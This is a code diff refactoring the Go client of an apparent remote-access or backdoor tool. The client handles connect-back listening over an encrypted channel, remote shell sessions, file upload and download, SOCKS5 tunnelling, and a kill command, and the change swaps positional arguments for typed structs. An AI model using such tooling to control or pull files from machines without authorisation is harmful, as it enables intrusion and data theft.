@@ -17,29 +17,33 @@ import (
 	terminal "golang.org/x/term"
 )
 
-func Run(secret []byte, host string, port int, socks5addr string, mode uint8, args []string) {
+type RunShellArgs struct {
+	Command string
+}
+
+type GetFileArgs struct {
+	Srcfile string
+	Dstdir  string
+}
+
+type PutFileArgs struct {
+	Srcfile string
+	Dstdir  string
+}
+
+type Socks5Args struct {
+	Socks5Addr string
+}
+
+func Run(secret []byte, host string, port int, mode uint8, arg any) {
 	var isConnectBack bool
-	var srcfile, dstdir, command string
 
 	if host == "cb" {
 		isConnectBack = true
 	}
-	command = "exec bash --login"
-	if mode == constants.RunShell && len(args) > 0 {
-		command = args[0]
-	}
-	if mode == constants.GetFile && len(args) >= 2 {
-		srcfile = args[0]
-		dstdir = args[1]
-	}
-	if mode == constants.PutFile && len(args) >= 2 {
-		srcfile = args[0]
-		dstdir = args[1]
-	}
 
 	waitForConnection := func() *pel.PktEncLayer {
 		if isConnectBack {
-			// connect back mode
 			addr := fmt.Sprintf(":%d", port)
 			ln, err := pel.Listen(addr, secret, false)
 			if err != nil {
@@ -72,33 +76,32 @@ func Run(secret []byte, host string, port int, socks5addr string, mode uint8, ar
 	case constants.Kill:
 		layer := waitForConnection()
 		layer.Close()
-		fmt.Println("Server killed.")
+		fmt.Println("Server killed")
 	case constants.RunShell:
-		handleRunShell(waitForConnection, command)
+		handleRunShell(waitForConnection, arg.(RunShellArgs))
 	case constants.GetFile:
-		handleGetFile(waitForConnection, srcfile, dstdir)
+		handleGetFile(waitForConnection, arg.(GetFileArgs))
 	case constants.PutFile:
-		handlePutFile(waitForConnection, srcfile, dstdir)
+		handlePutFile(waitForConnection, arg.(PutFileArgs))
 	case constants.SOCKS5:
-		handleSocks5(waitForConnection, socks5addr)
+		handleSocks5(waitForConnection, arg.(Socks5Args))
 	}
-
 }
 
-func handleGetFile(waitForConnection func() *pel.PktEncLayer, srcfile, dstdir string) {
+func handleGetFile(waitForConnection func() *pel.PktEncLayer, arg GetFileArgs) {
 	layer := waitForConnection()
 	defer layer.Close()
 	buffer := make([]byte, constants.MaxMessagesize)
 
-	basename := strings.ReplaceAll(srcfile, "\\", "/")
+	basename := strings.ReplaceAll(arg.Srcfile, "\\", "/")
 	basename = filepath.Base(filepath.FromSlash(basename))
 
-	f, err := os.OpenFile(filepath.Join(dstdir, basename), os.O_CREATE|os.O_RDWR, 0644)
+	f, err := os.OpenFile(filepath.Join(arg.Dstdir, basename), os.O_CREATE|os.O_RDWR, 0644)
 	if err != nil {
 		return
 	}
 	defer f.Close()
-	_, err = layer.Write([]byte(srcfile))
+	_, err = layer.Write([]byte(arg.Srcfile))
 	if err != nil {
 		return
 	}
@@ -114,11 +117,11 @@ func handleGetFile(waitForConnection func() *pel.PktEncLayer, srcfile, dstdir st
 	fmt.Print("\nDone.\n")
 }
 
-func handlePutFile(waitForConnection func() *pel.PktEncLayer, srcfile, dstdir string) {
+func handlePutFile(waitForConnection func() *pel.PktEncLayer, arg PutFileArgs) {
 	layer := waitForConnection()
 	defer layer.Close()
 	buffer := make([]byte, constants.MaxMessagesize)
-	f, err := os.Open(srcfile)
+	f, err := os.Open(arg.Srcfile)
 	if err != nil {
 		return
 	}
@@ -129,9 +132,9 @@ func handlePutFile(waitForConnection func() *pel.PktEncLayer, srcfile, dstdir st
 	}
 	fsize := fi.Size()
 
-	basename := filepath.Base(srcfile)
+	basename := filepath.Base(arg.Srcfile)
 	basename = strings.ReplaceAll(basename, "\\", "_")
-	_, err = layer.Write([]byte(dstdir + "/" + basename))
+	_, err = layer.Write([]byte(arg.Dstdir + "/" + basename))
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -147,7 +150,7 @@ func handlePutFile(waitForConnection func() *pel.PktEncLayer, srcfile, dstdir st
 	fmt.Print("\nDone.\n")
 }
 
-func handleRunShell(waitForConnection func() *pel.PktEncLayer, command string) {
+func handleRunShell(waitForConnection func() *pel.PktEncLayer, arg RunShellArgs) {
 	layer := waitForConnection()
 	defer layer.Close()
 	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
@@ -180,7 +183,7 @@ func handleRunShell(waitForConnection func() *pel.PktEncLayer, command string) {
 		return
 	}
 
-	_, err = layer.Write([]byte(command))
+	_, err = layer.Write([]byte(arg.Command))
 	if err != nil {
 		return
 	}
@@ -193,8 +196,8 @@ func handleRunShell(waitForConnection func() *pel.PktEncLayer, command string) {
 	}()
 	_, _ = utils.CopyBuffer(layer, os.Stdin, buffer2)
 }
-func handleSocks5(waitForConnection func() *pel.PktEncLayer, socks5addr string) {
-	addr, err := net.ResolveTCPAddr("tcp", socks5addr)
+func handleSocks5(waitForConnection func() *pel.PktEncLayer, arg Socks5Args) {
+	addr, err := net.ResolveTCPAddr("tcp", arg.Socks5Addr)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
